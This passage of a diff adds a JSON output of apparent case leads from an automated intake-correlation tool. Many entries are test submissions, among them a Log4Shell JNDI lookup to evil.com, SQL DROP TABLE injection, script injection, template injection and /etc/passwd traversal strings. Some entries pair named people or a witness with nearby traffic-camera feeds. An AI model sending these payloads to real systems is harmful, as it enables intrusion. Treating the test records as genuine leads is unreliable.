+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0142",
+      "entity_name": "${JNDI:LDAP: EVIL COM A}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ${jndi:ldap://evil.com/a}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0143",
+      "entity_name": "ETC PASSWD",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ../../../../etc/passwd"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0144",
+      "entity_name": "🚨 WHISTLEBLOWER 🕵️‍♂️ ‮REVERSED‬",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: International Corruption | Multi-lingual evidence: 日本語, العربية, 中文, Русский."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0145",
+      "entity_name": "CONCURRENT USER 0",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 0"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0146",
+      "entity_name": "CONCURRENT USER 1",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 1"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0147",
+      "entity_name": "CONCURRENT USER 2",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 2"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0148",
+      "entity_name": "CONCURRENT USER 3",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 3"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0149",
+      "entity_name": "CONCURRENT USER 4",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 4"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0150",
+      "entity_name": "CONCURRENT USER 5",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 5"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0151",
+      "entity_name": "CONCURRENT USER 6",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 6"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0152",
+      "entity_name": "CONCURRENT USER 7",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 7"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0153",
+      "entity_name": "CONCURRENT USER 8",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 8"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0154",
+      "entity_name": "CONCURRENT USER 9",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 9"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0155",
+      "entity_name": "CONCURRENT USER 10",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 10"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0156",
+      "entity_name": "CONCURRENT USER 11",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 11"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0157",
+      "entity_name": "CONCURRENT USER 12",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 12"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0158",
+      "entity_name": "CONCURRENT USER 13",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 13"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0159",
+      "entity_name": "CONCURRENT USER 14",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 14"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0160",
+      "entity_name": "CONCURRENT USER 15",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 15"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0161",
+      "entity_name": "CONCURRENT USER 16",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 16"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0162",
+      "entity_name": "CONCURRENT USER 17",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 17"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0163",
+      "entity_name": "CONCURRENT USER 18",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 18"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0164",
+      "entity_name": "CONCURRENT USER 19",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 19"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0165",
+      "entity_name": "CONCURRENT USER 20",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 20"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0166",
+      "entity_name": "CONCURRENT USER 21",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 21"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0167",
+      "entity_name": "CONCURRENT USER 22",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 22"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0168",
+      "entity_name": "CONCURRENT USER 23",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 23"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0169",
+      "entity_name": "CONCURRENT USER 24",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 24"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0170",
+      "entity_name": "CONCURRENT USER 25",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 25"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0171",
+      "entity_name": "CONCURRENT USER 26",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 26"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0172",
+      "entity_name": "CONCURRENT USER 27",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 27"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0173",
+      "entity_name": "CONCURRENT USER 28",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 28"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0174",
+      "entity_name": "CONCURRENT USER 29",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 29"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0175",
+      "entity_name": "DEAN INNOCENZI",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Logistics Conduit Audit | Quantum Auto Dismantler shipment conduit to 1456 Cedar Lane."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0176",
+      "entity_name": "DEAN INNOCENZI",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Logistics Conduit Audit | Quantum Auto Dismantler shipment conduit to 1456 Cedar Lane."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0177",
+      "entity_name": "WHISTLEBLOWER WITNESS A",
+      "address": "ANAHEIM, CA",
+      "apn": null,
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Disclosure | Evidence of $1.5M COVID relief diversion to Chamber of Commerce."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0178",
+      "entity_name": "DEAN INNOCENZI",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Logistics Conduit Audit | Quantum Auto Dismantler shipment conduit to 1456 Cedar Lane."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0179",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0180",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0181",
+      "entity_name": "LARGE PAYLOAD TEST",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Stress Test | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0182",
+      "entity_name": "; DROP TABLE CASES;",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | '; DROP TABLE cases; --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0183",
+      "entity_name": "<SCRIPT>ALERT XSS < SCRIPT>",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | <script>alert('XSS')</script>"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0184",
+      "entity_name": "{{7*7}}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | {{7*7}}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0185",
+      "entity_name": "${JNDI:LDAP: EVIL COM A}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ${jndi:ldap://evil.com/a}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0186",
+      "entity_name": "ETC PASSWD",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ../../../../etc/passwd"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0187",
+      "entity_name": "🚨 WHISTLEBLOWER 🕵️‍♂️ ‮REVERSED‬",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: International Corruption | Multi-lingual evidence: 日本語, العربية, 中文, Русский."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0188",
+      "entity_name": "CONCURRENT USER 0",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 0"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0189",
+      "entity_name": "CONCURRENT USER 1",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 1"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0190",
+      "entity_name": "CONCURRENT USER 2",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 2"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0191",
+      "entity_name": "CONCURRENT USER 3",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 3"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0192",
+      "entity_name": "CONCURRENT USER 4",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 4"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0193",
+      "entity_name": "CONCURRENT USER 5",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 5"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0194",
+      "entity_name": "CONCURRENT USER 6",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 6"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0195",
+      "entity_name": "CONCURRENT USER 7",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 7"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0196",
+      "entity_name": "CONCURRENT USER 8",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 8"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0197",
+      "entity_name": "CONCURRENT USER 9",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 9"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0198",
+      "entity_name": "CONCURRENT USER 10",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 10"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0199",
+      "entity_name": "CONCURRENT USER 11",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 11"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0200",
+      "entity_name": "CONCURRENT USER 12",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 12"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0201",
+      "entity_name": "CONCURRENT USER 13",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 13"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0202",
+      "entity_name": "CONCURRENT USER 14",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 14"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0203",
+      "entity_name": "CONCURRENT USER 15",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 15"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0204",
+      "entity_name": "CONCURRENT USER 16",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 16"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0205",
+      "entity_name": "CONCURRENT USER 17",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 17"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0206",
+      "entity_name": "CONCURRENT USER 18",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 18"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0207",
+      "entity_name": "CONCURRENT USER 19",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 19"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0208",
+      "entity_name": "CONCURRENT USER 20",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 20"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0209",
+      "entity_name": "CONCURRENT USER 21",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 21"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0210",
+      "entity_name": "CONCURRENT USER 22",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 22"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0211",
+      "entity_name": "CONCURRENT USER 23",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 23"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0212",
+      "entity_name": "CONCURRENT USER 24",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 24"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0213",
+      "entity_name": "CONCURRENT USER 25",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 25"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0214",
+      "entity_name": "CONCURRENT USER 26",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 26"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0215",
+      "entity_name": "CONCURRENT USER 27",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 27"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0216",
+      "entity_name": "CONCURRENT USER 28",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 28"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0217",
+      "entity_name": "CONCURRENT USER 29",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 29"
+    }
+  ],
+  "next_run_hint": "Runs every 2h via GitHub Actions + continuous in Azure App Service if ENABLE_AUTO_CORRELATION=1"
+}
